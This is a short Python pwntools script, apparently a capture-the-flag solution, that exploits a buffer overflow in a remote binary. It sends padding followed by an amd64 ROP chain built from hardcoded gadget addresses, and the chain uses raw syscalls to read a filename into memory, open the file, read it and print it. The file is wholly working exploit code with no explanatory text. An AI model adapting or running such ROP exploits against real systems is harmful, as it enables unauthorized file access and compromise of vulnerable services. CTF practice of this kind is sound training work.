from pwn import *


def sexy_burritos(io):
    L_pop_rdi = 0x0047eb23
    L_pop_rsi = 0x0041e41e
    L_pop_rdx = 0x004017ef
    L_pop_rax = 0x004694a5
    L_syscall = 0x004a4ee9
    flag = 0x4ff300
    io.sendline('A')
    io.recvuntil('->')
    ropchain = [
        'A'*(0x12),
        L_pop_rdi,
        0,
        L_pop_rsi,
        flag,
        L_pop_rdx,
        8,
        L_pop_rax,
        0,
        L_syscall,
        L_pop_rdi,
        flag,
        L_pop_rsi,
        0,
        L_pop_rax,
        2,
        L_syscall,
        L_pop_rdi,
        3,
        L_pop_rsi,
        flag,
        L_pop_rdx,
        100,
        L_pop_rax,
        0,
        L_syscall,
        L_pop_rdi,
        1,
        L_pop_rsi,
        flag,
        L_pop_rax,
        1,
        L_syscall
    ]
    io.sendline(flat(ropchain, arch='amd64'))


if __name__ == "__main__":
    #io = process('./vuln')
    io = remote('gc1.eng.run',31193)
    io.recvuntil('&\n')
    sexy_burritos(io)
    io.interactive()
